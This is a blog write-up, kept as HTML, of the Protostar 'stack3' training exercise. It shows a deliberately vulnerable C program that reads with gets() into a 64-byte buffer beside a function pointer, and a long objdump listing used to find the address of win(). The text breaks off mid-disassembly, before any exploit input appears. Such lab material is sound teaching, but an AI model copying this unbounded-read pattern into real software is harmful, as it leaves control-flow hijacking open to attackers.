@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Here is the source of the vulnerable program : 123456789101112131415161718192021222324#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void win()&amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Protostar vm, stack3">
+<meta property="og:url" content="http://slayne.github.io/2016/02/01/stack3/index.html">
+<meta property="og:site_name" content="The Hacker Apprentice">
+<meta property="og:description" content="Here is the source of the vulnerable program : 123456789101112131415161718192021222324#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void win()&amp;#123">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-05-19T14:08:06.280Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Protostar vm, stack3">
+<meta name="twitter:description" content="Here is the source of the vulnerable program : 123456789101112131415161718192021222324#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void win()&amp;#123">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Protostar vm, stack3</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/02/01/stack2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/01/27/first-article/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2016/02/01/stack3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2016/02/01/stack3/&text=Protostar vm, stack3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2016/02/01/stack3/&is_video=false&description=Protostar vm, stack3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Protostar vm, stack3&body=Check out this article: http://slayne.github.io/2016/02/01/stack3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2016/02/01/stack3/&title=Protostar vm, stack3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2016/02/01/stack3/&name=Protostar vm, stack3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Protostar vm, stack3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">The Hacker Apprentice</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-01-31T23:00:00.000Z" itemprop="datePublished">01-02-2016</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/protostar/">protostar</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Here is the source of the vulnerable program :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  fp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fp) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</span><br><span class="line">      fp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This exercicce is a bit diffferent. We need to change the flow to the program : when the program calls the fp function, it has to be redirected to the win function.</p>
+<p>In order to do that we need to see where the win function is stored using objdump for example (probably not the best option) :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ objdump -d stack3</span><br><span class="line"></span><br><span class="line">stack3:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">080482e0 &lt;_init&gt;:</span><br><span class="line"> 80482e0: 55                    push   %ebp</span><br><span class="line"> 80482e1: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 80482e3: 53                    push   %ebx</span><br><span class="line"> 80482e4: 83 ec 04              sub    <span class="variable">$0x4</span>,%esp</span><br><span class="line"> 80482e7: e8 00 00 00 00        call   80482ec &lt;_init+0xc&gt;</span><br><span class="line"> 80482ec: 5b                    pop    %ebx</span><br><span class="line"> 80482ed: 81 c3 90 13 00 00     add    <span class="variable">$0x1390</span>,%ebx</span><br><span class="line"> 80482f3: 8b 93 <span class="built_in">fc</span> ff ff ff     mov    -0x4(%ebx),%edx</span><br><span class="line"> 80482f9: 85 d2                 <span class="built_in">test</span>   %edx,%edx</span><br><span class="line"> 80482fb: 74 05                 je     8048302 &lt;_init+0x22&gt;</span><br><span class="line"> 80482fd: e8 1e 00 00 00        call   8048320 &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 8048302: e8 f9 00 00 00        call   8048400 &lt;frame_dummy&gt;</span><br><span class="line"> 8048307: e8 e4 01 00 00        call   80484f0 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 804830c: 58                    pop    %eax</span><br><span class="line"> 804830d: 5b                    pop    %ebx</span><br><span class="line"> 804830e: c9                    leave  </span><br><span class="line"> 804830f: c3                    ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048310 &lt;__gmon_start__@plt-0x10&gt;:</span><br><span class="line"> 8048310: ff 35 80 96 04 08     pushl  0x8049680</span><br><span class="line"> 8048316: ff 25 84 96 04 08     jmp    *0x8049684</span><br><span class="line"> 804831c: 00 00                 add    %al,(%eax)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">08048320 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 8048320: ff 25 88 96 04 08     jmp    *0x8049688</span><br><span class="line"> 8048326: 68 00 00 00 00        push   <span class="variable">$0x0</span></span><br><span class="line"> 804832b: e9 e0 ff ff ff        jmp    8048310 &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">08048330 &lt;gets@plt&gt;:</span><br><span class="line"> 8048330: ff 25 8c 96 04 08     jmp    *0x804968c</span><br><span class="line"> 8048336: 68 08 00 00 00        push   <span class="variable">$0x8</span></span><br><span class="line"> 804833b: e9 d0 ff ff ff        jmp    8048310 &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">08048340 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048340: ff 25 90 96 04 08     jmp    *0x8049690</span><br><span class="line"> 8048346: 68 10 00 00 00        push   <span class="variable">$0x10</span></span><br><span class="line"> 804834b: e9 c0 ff ff ff        jmp    8048310 &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">08048350 &lt;<span class="built_in">printf</span>@plt&gt;:</span><br><span class="line"> 8048350: ff 25 94 96 04 08     jmp    *0x8049694</span><br><span class="line"> 8048356: 68 18 00 00 00        push   <span class="variable">$0x18</span></span><br><span class="line"> 804835b: e9 b0 ff ff ff        jmp    8048310 &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">08048360 &lt;puts@plt&gt;:</span><br><span class="line"> 8048360: ff 25 98 96 04 08     jmp    *0x8049698</span><br><span class="line"> 8048366: 68 20 00 00 00        push   <span class="variable">$0x20</span></span><br><span class="line"> 804836b: e9 a0 ff ff ff        jmp    8048310 &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048370 &lt;_start&gt;:</span><br><span class="line"> 8048370: 31 ed                 xor    %ebp,%ebp</span><br><span class="line"> 8048372: 5e                    pop    %esi</span><br><span class="line"> 8048373: 89 e1                 mov    %esp,%ecx</span><br><span class="line"> 8048375: 83 e4 f0              and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line"> 8048378: 50                    push   %eax</span><br><span class="line"> 8048379: 54                    push   %esp</span><br><span class="line"> 804837a: 52                    push   %edx</span><br><span class="line"> 804837b: 68 80 84 04 08        push   <span class="variable">$0x8048480</span></span><br><span class="line"> 8048380: 68 90 84 04 08        push   <span class="variable">$0x8048490</span></span><br><span class="line"> 8048385: 51                    push   %ecx</span><br><span class="line"> 8048386: 56                    push   %esi</span><br><span class="line"> 8048387: 68 38 84 04 08        push   <span class="variable">$0x8048438</span></span><br><span class="line"> 804838c: e8 af ff ff ff        call   8048340 &lt;__libc_start_main@plt&gt;</span><br><span class="line"> 8048391: f4                    hlt    </span><br><span class="line"> 8048392: 90                    nop</span><br><span class="line"> 8048393: 90                    nop</span><br><span class="line"> 8048394: 90                    nop</span><br><span class="line"> 8048395: 90                    nop</span><br><span class="line"> 8048396: 90                    nop</span><br><span class="line"> 8048397: 90                    nop</span><br><span class="line"> 8048398: 90                    nop</span><br><span class="line"> 8048399: 90                    nop</span><br><span class="line"> 804839a: 90                    nop</span><br><span class="line"> 804839b: 90                    nop</span><br><span class="line"> 804839c: 90                    nop</span><br><span class="line"> 804839d: 90                    nop</span><br><span class="line"> 804839e: 90                    nop</span><br><span class="line"> 804839f: 90                    nop</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__do_global_dtors_aux&gt;:</span><br><span class="line"> 80483a0: 55                    push   %ebp</span><br><span class="line"> 80483a1: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 80483a3: 53                    push   %ebx</span><br><span class="line"> 80483a4: 83 ec 04              sub    <span class="variable">$0x4</span>,%esp</span><br><span class="line"> 80483a7: 80 3d a4 96 04 08 00  cmpb   <span class="variable">$0x0</span>,0x80496a4</span><br><span class="line"> 80483ae: 75 3f                 jne    80483ef &lt;__do_global_dtors_aux+0x4f&gt;</span><br><span class="line"> 80483b0: a1 a8 96 04 08        mov    0x80496a8,%eax</span><br><span class="line"> 80483b5: bb a0 95 04 08        mov    <span class="variable">$0x80495a0</span>,%ebx</span><br><span class="line"> 80483ba: 81 eb 9c 95 04 08     sub    <span class="variable">$0x804959c</span>,%ebx</span><br><span class="line"> 80483c0: c1 fb 02              sar    <span class="variable">$0x2</span>,%ebx</span><br><span class="line"> 80483c3: 83 eb 01              sub    <span class="variable">$0x1</span>,%ebx</span><br><span class="line"> 80483c6: 39 d8                 cmp    %ebx,%eax</span><br><span class="line"> 80483c8: 73 1e                 jae    80483e8 &lt;__do_global_dtors_aux+0x48&gt;</span><br><span class="line"> 80483ca: 8d b6 00 00 00 00     lea    0x0(%esi),%esi</span><br><span class="line"> 80483d0: 83 c0 01              add    <span class="variable">$0x1</span>,%eax</span><br><span class="line"> 80483d3: a3 a8 96 04 08        mov    %eax,0x80496a8</span><br><span class="line"> 80483d8: ff 14 85 9c 95 04 08  call   *0x804959c(,%eax,4)</span><br><span class="line"> 80483df: a1 a8 96 04 08        mov    0x80496a8,%eax</span><br><span class="line"> 80483e4: 39 d8                 cmp    %ebx,%eax</span><br><span class="line"> 80483e6: 72 e8                 jb     80483d0 &lt;__do_global_dtors_aux+0x30&gt;</span><br><span class="line"> 80483e8: c6 05 a4 96 04 08 01  movb   <span class="variable">$0x1</span>,0x80496a4</span><br><span class="line"> 80483ef: 83 c4 04              add    <span class="variable">$0x4</span>,%esp</span><br><span class="line"> 80483f2: 5b                    pop    %ebx</span><br><span class="line"> 80483f3: 5d                    pop    %ebp</span><br><span class="line"> 80483f4: c3                    ret    </span><br><span class="line"> 80483f5: 8d 74 26 00           lea    0x0(%esi,%eiz,1),%esi</span><br><span class="line"> 80483f9: 8d bc 27 00 00 00 00  lea    0x0(%edi,%eiz,1),%edi</span><br><span class="line"></span><br><span class="line">08048400 &lt;frame_dummy&gt;:</span><br><span class="line"> 8048400: 55                    push   %ebp</span><br><span class="line"> 8048401: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 8048403: 83 ec 18              sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line"> 8048406: a1 a4 95 04 08        mov    0x80495a4,%eax</span><br><span class="line"> 804840b: 85 c0                 <span class="built_in">test</span>   %eax,%eax</span><br><span class="line"> 804840d: 74 12                 je     8048421 &lt;frame_dummy+0x21&gt;</span><br><span class="line"> 804840f: b8 00 00 00 00        mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line"> 8048414: 85 c0                 <span class="built_in">test</span>   %eax,%eax</span><br><span class="line"> 8048416: 74 09                 je     8048421 &lt;frame_dummy+0x21&gt;</span><br><span class="line"> 8048418: c7 04 24 a4 95 04 08  movl   <span class="variable">$0x80495a4</span>,(%esp)</span><br><span class="line"> 804841f: ff d0                 call   *%eax</span><br><span class="line"> 8048421: c9                    leave  </span><br><span class="line"> 8048422: c3                    ret    </span><br><span class="line"> 8048423: 90                    nop</span><br><span class="line"></span><br><span class="line">08048424 &lt;win&gt;:</span><br><span class="line"> 8048424: 55                    push   %ebp</span><br><span class="line"> 8048425: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 8048427: 83 ec 18              sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line"> 804842a: c7 04 24 40 85 04 08  movl   <span class="variable">$0x8048540</span>,(%esp)</span><br><span class="line"> 8048431: e8 2a ff ff ff        call   8048360 &lt;puts@plt&gt;</span><br><span class="line"> 8048436: c9                    leave  </span><br><span class="line"> 8048437: c3                    ret    </span><br><span class="line"></span><br><span class="line">08048438 &lt;main&gt;:</span><br><span class="line"> 8048438: 55                    push   %ebp</span><br><span class="line"> 8048439: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 804843b: 83 e4 f0              and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line"> 804843e: 83 ec 60              sub    <span class="variable">$0x60</span>,%esp</span><br><span class="line"> 8048441: c7 44 24 5c 00 00 00  movl   <span class="variable">$0x0</span>,0x5c(%esp)</span><br><span class="line"> 8048448: 00 </span><br><span class="line"> 8048449: 8d 44 24 1c           lea    0x1c(%esp),%eax</span><br><span class="line"> 804844d: 89 04 24              mov    %eax,(%esp)</span><br><span class="line"> 8048450: e8 db fe ff ff        call   8048330 &lt;gets@plt&gt;</span><br><span class="line"> 8048455: 83 7c 24 5c 00        cmpl   <span class="variable">$0x0</span>,0x5c(%esp)</span><br><span class="line"> 804845a: 74 1b                 je     8048477 &lt;main+0x3f&gt;</span><br><span class="line"> 804845c: b8 60 85 04 08        mov    <span class="variable">$0x8048560</span>,%eax</span><br><span class="line"> 8048461: 8b 54 24 5c           mov    0x5c(%esp),%edx</span><br><span class="line"> 8048465: 89 54 24 04           mov    %edx,0x4(%esp)</span><br><span class="line"> 8048469: 89 04 24              mov    %eax,(%esp)</span><br><span class="line"> 804846c: e8 df fe ff ff        call   8048350 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"> 8048471: 8b 44 24 5c           mov    0x5c(%esp),%eax</span><br><span class="line"> 8048475: ff d0                 call   *%eax</span><br><span class="line"> 8048477: c9                    leave  </span><br><span class="line"> 8048478: c3                    ret    </span><br><span class="line"> 8048479: 90                    nop</span><br><span class="line"> 804847a: 90                    nop</span><br><span class="line"> 804847b: 90                    nop</span><br><span class="line"> 804847c: 90                    nop</span><br><span class="line"> 804847d: 90                    nop</span><br><span class="line"> 804847e: 90                    nop</span><br><span class="line"> 804847f: 90                    nop</span><br><span class="line"></span><br><span class="line">08048480 &lt;__libc_csu_fini&gt;:</span><br><span class="line"> 8048480: 55                    push   %ebp</span><br><span class="line"> 8048481: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 8048483: 5d                    pop    %ebp</span><br><span class="line"> 8048484: c3                    ret    </span><br><span class="line"> 8048485: 8d 74 26 00           lea    0x0(%esi,%eiz,1),%esi</span><br><span class="line"> 8048489: 8d bc 27 00 00 00 00  lea    0x0(%edi,%eiz,1),%edi</span><br><span class="line"></span><br><span class="line">08048490 &lt;__libc_csu_init&gt;:</span><br><span class="line"> 8048490: 55                    push   %ebp</span><br><span class="line"> 8048491: 89 e5                 mov    %esp,%ebp</span><br><span class="line"> 8048493: 57                    push   %edi</span><br><span class="line"> 8048494: 56                    push   %esi</span><br><span class="line"> 8048495: 53                    push   %ebx</span><br><span class="line"> 8048496: e8 4f 00 00 00        call   80484ea &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 804849b: 81 c3 e1 11 00 00     add    <span class="variable">$0x11e1</span>,%ebx</span><br><span class="line"> 80484a1: 83 ec 1c              sub    <span class="variable">$0x1c</span>,%esp</span><br><span class="line"> 80484a4: e8 37 fe ff ff        call   80482e0 &lt;_init&gt;</span><br><span class="line"> 80484a9: 8d bb 18 ff ff ff     lea    -0xe8(%ebx),%edi</span><br><span class="line"> 80484af: 8d 83 18 ff ff ff     lea    -0xe8(%ebx),%eax</span><br><span class="line"> 80484b5: 29 c7                 sub    %eax,%edi</span><br><span class="line"> 80484b7: c1 ff 02              sar    <span class="variable">$0x2</span>,%edi</span><br><span class="line"> 80484ba: 85 ff                 <span class="built_in">test</span>   %edi,%edi</span><br><span class="line"> 80484bc: 74 24                 je     80484e2 &lt;__libc_csu_init+0x52&gt;</span><br><span class="line"> 80484be: 31 f6                 xor    %esi,%esi</span><br><span class="line"> 80484c0: 8b 45 10              mov    0x10(%ebp),%eax</span><br><span class="line"> 80484c3: 89 44 24 08           mov    %eax,0x8(%esp)</span><br><span class="line"> 80484c7: 8b 45 0c              mov    0xc(%ebp),%eax</span><br><span class="line"> 80484ca: 89 44 24 04           mov    %eax,0x4(%esp)</span><br><span class="line"> 80484ce: 8b 45 08              mov    0x8(%ebp),%eax</span><br><span class="line"> 80484d1: 89 04 24              mov    %eax,(%esp)</span><br><span class="line"> 80484d4: ff 94 b3 18 ff ff ff  call   *-0xe8(%ebx,%esi,4)</span><br><span class="line"> 80484db: 83 c6 01              add    <span class="variable">$0x1</span>,%esi</span><br><span class="line"> 80484de: 39 fe                 cmp    %edi,%esi</span><br><span class="line"> 80484e0: 72 de                 jb     80484c0 &lt;__libc_csu_init+0x30&gt;</span><br><span class="line"> 80484e2: 83 c4 1c              add    <span class="variable">$0x1c</span>,%esp</span><br><span class="line"> 80484e5: 5b                    pop    %ebx</span><br><span class="line"> 80484e6: 5e                    pop    %esi</span><br><span class="line"> 80484e7: 5f                    pop    %edi</span><br><span class="line"> 80484e8: 5d                    pop    %ebp</span><br><span class="line"> 80484e9: c3                    ret    </span><br><span class="line"></span><br><span class="line">080484ea &lt;__i686.get_pc_thunk.bx&gt;:</span><br><span class="line"> 80484ea: 8b 1c 24              mov    (%esp),%ebx</span><br><span class="line"> 80484ed: c3                    ret    </span><br><span class="line"> 80484ee: 90                    nop</span><br><span class="line"> 80484ef: 90                    nop</span><br><span class="line"></span><br><span class="line">080484f0 